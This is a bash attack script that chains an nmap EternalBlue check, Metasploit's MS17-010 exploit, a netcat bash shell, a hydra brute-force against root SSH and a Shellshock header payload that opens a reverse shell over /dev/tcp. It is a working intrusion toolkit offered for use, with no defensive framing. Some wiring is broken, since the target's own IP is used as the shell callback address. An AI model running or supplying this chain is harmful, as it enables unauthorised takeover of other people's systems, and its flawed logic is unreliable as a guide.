#!/bin/bash

# Function to check for vulnerable systems (EternalBlue)
function check_eternalblue_vulnerability {
  echo "Checking SMB vulnerability..."
  nmap -p445 --script smb-vuln-ms17-010 $1
}

# Function to exploit EternalBlue vulnerability using Metasploit
function exploit_eternalblue {
  echo "Exploiting EternalBlue with Metasploit..."
  msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $1; run;"
}

# Use Netcat for reverse shell payload delivery (stealthier than Metasploit)
function deliver_reverse_shell {
  echo "Delivering reverse shell via Netcat..."
  nc -e /bin/bash $1 4444
}

# Hydra for brute-force attack (only if password is weak)
function brute_force_attack {
  echo "Attempting brute-force attack on SSH..."
  hydra -l root -P /path/to/wordlist.txt ssh://$1
}

# Function to handle Shellshock exploitation using Curl
function exploit_shellshock {
  echo "Exploiting Shellshock vulnerability..."
  curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/$1/4444 0>&1" http://$2
}

# Main function
function main {
  TARGET=$1

  # Check if the system is vulnerable to EternalBlue
  check_eternalblue_vulnerability $TARGET

  # Attempt to exploit EternalBlue
  exploit_eternalblue $TARGET

  # Attempt reverse shell delivery
  deliver_reverse_shell $TARGET

  # Try brute-force attack if necessary
  brute_force_attack $TARGET

  # Shellshock exploit for web servers
  exploit_shellshock $TARGET $2
}

# Usage: ./exploit.sh <target_ip> <web_target_ip>
main $1 $2
